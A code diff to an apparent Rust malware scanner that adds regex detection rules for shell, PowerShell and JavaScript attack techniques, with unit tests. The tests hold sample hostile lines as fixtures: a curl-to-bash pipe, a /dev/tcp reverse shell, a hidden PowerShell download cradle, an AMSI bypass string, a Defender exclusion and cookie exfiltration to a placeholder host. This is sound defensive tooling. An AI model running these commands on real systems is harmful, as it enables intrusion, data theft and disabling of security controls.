@@ -157,6 +157,133 @@ static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| {
             "Characters combined with a key by XOR, a common light obfuscation.",
             &[r"\bord\s*\([^)]*\)\s*\^|\^\s*ord\s*\(|\bchr\s*\([^)]*\^"],
         ),
+        // --- Shell ---------------------------------------------------------
+        rule(
+            "sh-download-exec",
+            Level::Fail,
+            "Pipes a download into a shell",
+            "curl or wget output is run directly by a shell or interpreter.",
+            &[
+                r"\b(?:curl|wget|fetch)\b[^\n|]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b|\b(?:curl|wget)\b[^\n|]*\|\s*(?:python[23]?|perl|php|ruby|node)\b",
+            ],
+        ),
+        rule(
+            "sh-reverse-shell",
+            Level::Fail,
+            "Shell reverse shell pattern",
+            "Redirects a shell to /dev/tcp, or uses nc/ncat/socat to attach a shell to a remote host.",
+            &[
+                r"/dev/(?:tcp|udp)/[^\s/]+/\d+|\b(?:nc|ncat|netcat)\b[^\n]*\s-(?:e|c)\s|\bsocat\b[^\n]*exec:|\bmkfifo\b[^\n]*\b(?:nc|ncat)\b",
+            ],
+        ),
+        rule(
+            "sh-cleanup",
+            Level::Warn,
+            "Clears history or logs",
+            "Wipes shell history or system logs, often to hide activity.",
+            &[
+                r"\bhistory\s+-c\b|\bunset\s+HISTFILE\b|HISTFILE=/dev/null|>\s*/var/log/|\brm\s+-[rf]+\s+[^\n]*\.bash_history|\bshred\b",
+            ],
+        ),
+        rule(
+            "sh-temp-exec",
+            Level::Warn,
+            "Runs a file from a temp directory",
+            "Makes a file in /tmp, /var/tmp or /dev/shm executable or runs it.",
+            &[
+                r"\bchmod\s+(?:\+x|[0-7]*7[0-7]*)\s+/(?:tmp|var/tmp|dev/shm)/|(?:^|[\s;&|])/(?:tmp|var/tmp|dev/shm)/[\w.-]+(?:\s|$|;|&)",
+            ],
+        ),
+        // --- PowerShell ----------------------------------------------------
+        rule(
+            "ps-download-exec",
+            Level::Fail,
+            "PowerShell download and execute",
+            "DownloadString, Invoke-WebRequest or Invoke-RestMethod combined with Invoke-Expression.",
+            &[
+                r"(?i)DownloadString|DownloadData|Invoke-WebRequest|\biwr\b|Invoke-RestMethod|\birm\b|Net\.WebClient|BitsTransfer",
+                r"(?i)\bIEX\b|Invoke-Expression|\[scriptblock\]::Create",
+            ],
+        ),
+        rule(
+            "ps-amsi",
+            Level::Fail,
+            "AMSI bypass",
+            "Touches AmsiUtils or amsiInitFailed to switch off antimalware script scanning.",
+            &[r"(?i)AmsiUtils|amsiInitFailed|AmsiScanBuffer|amsi\.dll"],
+        ),
+        rule(
+            "ps-defender",
+            Level::Fail,
+            "Weakens Microsoft Defender",
+            "Adds Defender exclusions or disables real-time monitoring.",
+            &[
+                r"(?i)Add-MpPreference[^\n]*-Exclusion|Set-MpPreference[^\n]*-Disable(?:RealtimeMonitoring|IOAVProtection|BehaviorMonitoring|ScriptScanning)",
+            ],
+        ),
+        rule(
+            "ps-stealth",
+            Level::Warn,
+            "Hidden or policy-bypassing PowerShell",
+            "Runs PowerShell hidden, without a profile, or with the execution policy bypassed.",
+            &[
+                r"(?i)-w(?:indowstyle)?\s+hidden|-ep\s+bypass|-exec(?:utionpolicy)?\s+bypass|-nop(?:rofile)?\b[^\n]*-(?:w|ep|exec)",
+            ],
+        ),
+        rule(
+            "ps-reflection",
+            Level::Fail,
+            "Loads code in memory",
+            "Reflection.Assembly::Load or Add-Type with VirtualAlloc, typical of in-memory loaders.",
+            &[
+                r"(?i)\[(?:System\.)?Reflection\.Assembly\]::Load|Add-Type[^\n]*VirtualAlloc|\bVirtualAlloc\b[^\n]*\bCreateThread\b",
+            ],
+        ),
+        // --- JavaScript ------------------------------------------------------
+        rule(
+            "js-activex",
+            Level::Fail,
+            "Windows Script Host objects",
+            "ActiveXObject or WScript.Shell can run programs from JScript.",
+            &[
+                r"(?i)new\s+ActiveXObject|WScript\.Shell|Shell\.Application|Scripting\.FileSystemObject",
+            ],
+        ),
+        rule(
+            "js-child-process",
+            Level::Warn,
+            "Node.js runs system commands",
+            "Uses child_process to run programs.",
+            &[r"child_process|\bexecSync\s*\(|\bspawnSync\s*\("],
+        ),
+        rule(
+            "js-cookie-exfil",
+            Level::Fail,
+            "Sends cookies or form data elsewhere",
+            "Reads document.cookie or input values and sends them with fetch, XMLHttpRequest, sendBeacon or an image URL.",
+            &[
+                r"document\.cookie|\.value\b[^\n]*(?:password|card|cvv)",
+                r"\bfetch\s*\(|XMLHttpRequest|sendBeacon|new\s+Image\(\)|\.src\s*=",
+            ],
+        ),
+        rule(
+            "js-injection",
+            Level::Warn,
+            "Injects scripts or hidden frames",
+            "Writes script tags or hidden iframes into the page.",
+            &[
+                r#"(?i)document\.write(?:ln)?\s*\([^\n]*<(?:script|iframe)|createElement\(\s*['"](?:script|iframe)['"]\s*\)"#,
+            ],
+        ),
+        rule(
+            "js-miner",
+            Level::Fail,
+            "Cryptocurrency miner",
+            "References known browser mining libraries or pools.",
+            &[
+                r"(?i)coinhive|cryptonight|coin-hive|crypto-loot|minero\.cc|webminepool|stratum\+tcp",
+            ],
+        ),
         rule(
             "network",
             Level::Info,
@@ -216,7 +343,7 @@ pub fn exec_flag(
         rule: "exec-decoded",
         title: "Executes decoded code",
         detail: format!(
-            "Layer {parent} decodes ({steps}) and passes the result to {sink}(); see layer {layer}."
+            "Layer {parent} decodes ({steps}) and passes the result to {sink}; see layer {layer}."
         ),
         layer: parent,
         line: Some(line),
@@ -263,6 +390,42 @@ mod tests {
         let r =
             rules("open(os.path.expanduser('~/.bashrc'),'a')\nopen('/home/u/.ssh/id_rsa').read()");
         assert!(r.contains(&"persistence") && r.contains(&"cred-access"));
+    }
+
+    #[test]
+    fn shell_powershell_js_rules() {
+        let r = rules(
+            "curl -fsSL http://x/i.sh | sudo bash\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1\nhistory -c",
+        );
+        assert!(
+            r.contains(&"sh-download-exec")
+                && r.contains(&"sh-reverse-shell")
+                && r.contains(&"sh-cleanup")
+        );
+
+        let r = rules(
+            "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"",
+        );
+        assert!(r.contains(&"ps-download-exec") && r.contains(&"ps-stealth"));
+        assert!(
+            rules("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')")
+                .contains(&"ps-amsi")
+        );
+        assert!(rules("Add-MpPreference -ExclusionPath C:\\Temp").contains(&"ps-defender"));
+
+        let r = rules("var s = new ActiveXObject('WScript.Shell'); s.Run('calc')");
+        assert!(r.contains(&"js-activex"));
+        let r = rules("fetch('https://x/c?d=' + document.cookie)");
+        assert!(r.contains(&"js-cookie-exfil"));
+        assert!(
+            rules("document.write('<iframe src=x style=display:none>')").contains(&"js-injection")
+        );
+    }
+
+    #[test]
+    fn plain_shell_and_js_have_no_flags() {
+        assert!(rules("#!/bin/sh\nset -e\necho building\nmake -j4\n").is_empty());
+        assert!(rules("const sum = (a, b) => a + b;\nconsole.log(sum(1, 2));").is_empty());
     }
 
     #[test]
